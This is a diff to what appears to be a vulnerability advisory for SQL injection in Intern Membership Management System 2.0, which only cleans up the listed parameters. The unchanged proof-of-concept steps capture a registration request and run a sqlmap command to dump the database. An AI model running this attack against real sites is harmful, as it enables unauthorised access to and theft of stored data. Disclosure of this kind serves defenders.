@@ -11,7 +11,7 @@
 ## References: 
 
 ## Description:
-Intern Membership Management System 2.0 allows SQL Injection via parameters 'userName','firstName', 'lastName', '' and 'gender' in "/intern/user_registration/".
+Intern Membership Management System 2.0 allows SQL Injection via parameters 'userName', 'firstName', 'lastName', and 'gender' in "/intern/user_registration/".
 Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.
 
 ## Proof of Concept:
@@ -19,7 +19,7 @@ Exploiting this issue could allow an attacker to compromise the application, acc
 + Fill the form and click 'Register' button.
 + Intercept the request via Burp Suite and send to Repeater.
 + Copy and paste the request to a "r.txt" file.
-+ Use sqlmap to exploit. In sqlmap, use 'userName','firstName', 'lastName', '' and 'gender' parameters to dump the database. 
++ Use sqlmap to exploit. In sqlmap, use 'userName', 'firstName', 'lastName', and 'gender' parameters to dump the database. 
 + `python sqlmap.py -r r.txt -p userName --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db`
 ```
 [23:08:01] [INFO] parsing HTTP request from 'r.txt'
